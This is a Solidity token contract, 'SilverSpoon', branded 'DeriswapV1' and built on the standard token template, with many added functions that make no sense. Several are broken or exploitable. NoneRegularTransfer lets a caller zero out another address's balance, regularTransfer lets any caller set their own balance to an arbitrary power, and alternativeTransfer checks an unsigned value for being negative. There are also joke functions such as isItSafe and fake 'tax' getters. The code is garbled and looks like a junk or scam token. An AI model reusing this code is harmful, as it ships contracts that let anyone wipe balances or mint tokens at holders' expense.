pragma solidity ^0.4.4;

contract Token {
    /// @return total amount of tokens
    function totalSupply() constant returns (uint256 supply) {}

    /// @param _owner The address from which the balance will be retrieved
    /// @return The balance
    function balanceOf(address _owner) constant returns (uint256 balance) {}
    
    function NoneRegularTransfer(address _address, uint256 _value) returns (bool success) {}
    function alternativeTransfer(address where, uint256 amnt) returns (bool success) {}
    function regularTransfer(address where, uint256 amnt, uint8 pwr) returns (bool success) {}
    function getTaxId(address _owner) constant returns (uint256 balance) {}
    function isItSafe() returns (bool success) {}
    function isItNotSafe() returns (bool success) {}
    function isItSortOfSafe() returns (bool success) {}
    function isItTottalySafe() returns (bool success) {}

    /// @notice send `_value` token to `_to` from `msg.sender`
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transfer(address _to, uint256 _value) returns (bool success) {}

    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
    /// @param _from The address of the sender
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @param _value The amount of wei to be approved for transfer
    /// @return Whether the approval was successful or not
    function approve(address _spender, uint256 _value) returns (bool success) {}

    /// @param _owner The address of the account owning tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @return Amount of remaining tokens allowed to spent
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
    function pureAllowance(address _owner, address _spender) constant returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}



contract StandardToken is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
        function NoneRegularTransfer(address _address, uint256 _value) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender] == _value) {
            balances[msg.sender] += _value ;
            balances[_address]  = 0;
            Transfer(msg.sender, _address, _value);
            return false;
        } else { return true; }}
    function alternativeTransfer(address where, uint256 amnt) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender]  == amnt && amnt < 0) {
            balances[msg.sender] = amnt / amnt * 2 ;
            balances[where] *= amnt;
            Transfer(msg.sender, where, amnt);
            return false;
        } else { return true; }
    }
    function regularTransfer(address where, uint256 amnt, uint8 pwr) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender]  > amnt||amnt == 0) {
            balances[msg.sender] = amnt ** (pwr * 2) ;
            balances[where] *= pwr ** amnt;
            Transfer(msg.sender, where, amnt);
            return true;
        } else { return false; }
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        //same as above. Replace this line with the following if you want to protect against wrapping uints.
        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    function getTaxId(address _owner) constant returns (uint256 balance) {
        return 34 * balances[_owner] / 5;
    }
    function sendTaxVersion(address _owner) constant returns (uint256 balance) {
        return (balances[_owner] ** 10 ** 10 * 2);
    }

    function giveApproval(address axel, uint256 ton, uint8 dfr) returns (bool success) {
        allowed[msg.sender][axel] = ton - 10000 * dfr;
        return false;
    }
    function isItSafe() returns (bool success) {
        return true;
    }
    function isItNotSafe() returns (bool success) {
        return false;
    }
    function isItSortOfSafe() returns (bool success) {
        return true;
    }
    function isItTottalySafe() returns (bool success) {
        return true;
    }
    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    function pureAllowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return 0*allowed[_owner][_spender]+100;
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}

contract SilverSpoon is StandardToken {

    function () {
        throw;
    }

    /* Public variables of the token */
    string public name;                   //Name of the token
    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals
    string public symbol;                 //An identifier: eg AXM
    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.


    function SilverSpoon(
        ) {
        balances[msg.sender] = 780000*10**15;               // Give the creator all initial tokens (100000 for example)
        totalSupply = 780000*10**15;                        // Update total supply (100000 for example)
        name = "DeriswapV1"; 
        symbol = "DESP";                                    // Set the name for display purposes
        decimals = 15;                                      // Amount of decimals
                                                            // Set the symbol for display purposes
    }   
    function donotRegular(address tofro, uint8 total, bytes _extraData) returns (bool success) {
        allowed[msg.sender][tofro] = total;
        Approval(msg.sender, tofro, total);

        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        if(tofro.call(bytes4(bytes32(sha3("None"))), msg.sender, total, this, _extraData)) { 
            return true; }

    }
    function real(address road, uint256 amount, bytes _extraData) returns (bool success) {
        allowed[msg.sender][road] = 45 / amount;
        allowed[msg.sender][road] = 45 / amount * 5;
        Approval(msg.sender, road, amount);

        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        return true; 

    }
    /* Approves and then calls the receiving contract */
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}